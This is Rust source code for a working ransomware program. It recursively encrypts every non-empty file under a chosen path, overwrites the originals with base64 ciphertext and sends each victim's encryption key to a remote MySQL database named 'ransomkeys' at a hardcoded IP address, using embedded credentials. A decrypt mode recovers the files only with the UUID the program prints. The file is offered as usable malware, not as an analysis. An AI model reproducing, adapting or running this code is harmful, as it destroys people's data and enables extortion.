use base64::{engine::general_purpose, Engine as _};
use mysql::{prelude::Queryable, Pool, PooledConn};
use orion::{aead, kex::SecretKey};
use std::error::Error;
use std::sync::Arc;
use std::{
    fs::{OpenOptions},
    io::{Read, Write},
    process::exit,
};
use uuid::Uuid;

fn getfiles(path: &str) -> Result<Vec<String>, Box<dyn Error>> {
    let mut files = Vec::new();
    for entry in std::fs::read_dir(path)? {
        let entry = entry?;
        let path = entry.path();
        if path.is_dir() {
            files.extend(getfiles(&path.to_str().unwrap())?);
        } else {
            files.push(path.to_str().unwrap().to_string());
        }
    }
    Ok(files)
}

fn decrypt(stringtodec: &str, b64key: String) -> Result<String, Box<dyn Error>> {
    let enctext = general_purpose::STANDARD.decode(stringtodec)?;
    let b64key2 = general_purpose::STANDARD.decode(b64key)?;
    let key2 = aead::SecretKey::from_slice(&b64key2)?;
    let dectxt = aead::open(&key2, &enctext)?;
    let dectxt2 = std::str::from_utf8(&dectxt)?;
    return Ok(dectxt2.to_string());
}

fn encrypt(stringtoenc: &str, secretekey: &SecretKey) -> Result<Vec<u8>, Box<dyn Error>> {
    let ciphertext = aead::seal(&secretekey, stringtoenc.as_bytes())?;
    return Ok(ciphertext);
}

fn readfile(filepath: String) -> Result<String, Box<dyn Error>> {
    let mut file = std::fs::File::open(filepath)?;
    let mut contents = String::new();
    file.read_to_string(&mut contents)?;
    return Ok(contents.trim().to_owned());
}

fn create_table(uuid: String, conn: &mut PooledConn, key: String) {
    let uuid = uuid;
    let enckey = key;
    let create_table_query = format!("CREATE TABLE `{}` (`key` VARCHAR(255) NOT NULL);", uuid);
    conn.query_drop(&create_table_query).unwrap();
    let insert_query = format!("INSERT INTO {} (`key`) VALUES ('{}');", uuid, enckey);
    conn.query_drop(&insert_query).unwrap();
}

fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 3 {
        println!("Usage: {} <encrypt/decrypt> <path>", args[0]);
        exit(1);
    }
    let path = &args[2].trim_end();
    let args1 = args[1].trim_end();
    if args1 == "encrypt" {
        let url = "mysql://deja:S9$SjaXyGr7xh!7@89.215.12.15/ransomkeys";
        let pool = Arc::new(Pool::new(url).unwrap());
        let mut conn = pool.get_conn().unwrap();
        println!("REMEMBER THE FOLLOWING UNIQUE ID FOR DECRYPTION!");
        let assigned_uuid = Uuid::new_v4();
        let newest_string = assigned_uuid.to_string().replace("-", "").replace(" ", "");
        println!("{}", newest_string);
        let secret_key53 = orion::aead::SecretKey::default();
        let seckey65 = secret_key53.unprotected_as_bytes();
        let enc6432 = general_purpose::STANDARD.encode(seckey65);
        create_table(newest_string, &mut conn, enc6432);
        let files = getfiles(path)?;
        for file in files {
            let filee324 = file;
            let mut filee = OpenOptions::new().write(true).open(&filee324).unwrap();
            let filecont = readfile(filee324)?;
            if filecont != "" {
                let encrypted = encrypt(&filecont, &secret_key53)?;
                let enc64 = general_purpose::STANDARD.encode(encrypted);
                filee.set_len(0)?;
                filee.write(enc64.as_bytes())?;
                println!("{}", enc64);
            }
        }
    }
    if args1 == "decrypt" {
        let url = "mysql://deja:S9$SjaXyGr7xh!7@89.215.12.15/ransomkeys";
        let pool = Arc::new(Pool::new(url).unwrap());
        let mut conn = pool.get_conn().unwrap();
        let mut randomuuid = String::new();
        println!("Please enter your UUID for decryption: ");
        std::io::stdin().read_line(&mut randomuuid).unwrap();
        let files = getfiles(path)?;
        let mut key_value: Option<String> = None;
        let checkquery = format!("SELECT `key` FROM `{}`;", randomuuid.trim());
        let result = conn.query_iter(checkquery).unwrap();
        for row in result {
            let key: String = mysql::from_row(row.unwrap());
            key_value = Some(key);
        }
        let key_str = key_value.unwrap_or_default();
        for file in files {
            let mut fileopen = OpenOptions::new().write(true).open(&file).unwrap();
            let filecont = readfile(file)?;
			if filecont.trim() != "" {
				let decced = decrypt(&filecont, key_str.clone())?;
            	fileopen.set_len(0)?;
            	fileopen.write(decced.as_bytes())?;
			}
        }
    }
    println!("Press enter to exit.");
    let mut input = String::new();
    let stdin = std::io::stdin();
    stdin.read_line(&mut input).unwrap();
    exit(0);
}
